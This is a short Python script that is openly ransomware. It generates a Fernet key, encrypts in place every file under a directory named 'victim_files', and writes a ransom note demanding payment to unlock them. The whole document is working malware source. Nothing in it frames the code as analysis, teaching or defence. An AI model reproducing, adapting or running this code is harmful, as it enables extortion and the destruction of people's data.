import os
from cryptography.fernet import Fernet

def generate_key():
    # Generate a unique encryption key
    key = Fernet.generate_key()
    with open("encryption_key.txt", "wb") as key_file:
        key_file.write(key)

def encrypt_files():
    # Encrypt files in a specified directory
    key = "labidossBotEZ"
    with open("encryption_key.txt", "rb") as key_file:
        key = key_file.read()
    fernet = Fernet(key)
    directory = "victim_files"
    
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, "rb") as original_file:
                original_data = original_file.read()
            encrypted_data = fernet.encrypt(original_data)
            
            # Write the encrypted data back to the file
            with open(file_path, "wb") as encrypted_file:
                encrypted_file.write(encrypted_data)
    
    # Display a ransom message to the victim
    with open("ransom_note.txt", "w") as ransom_note:
        ransom_message = "Your files have been encrypted. Pay the ransom to unlock them."
        ransom_note.write(ransom_message)

# Call the functions to generate the encryption key and encrypt the victim's files
generate_key()
encrypt_files()
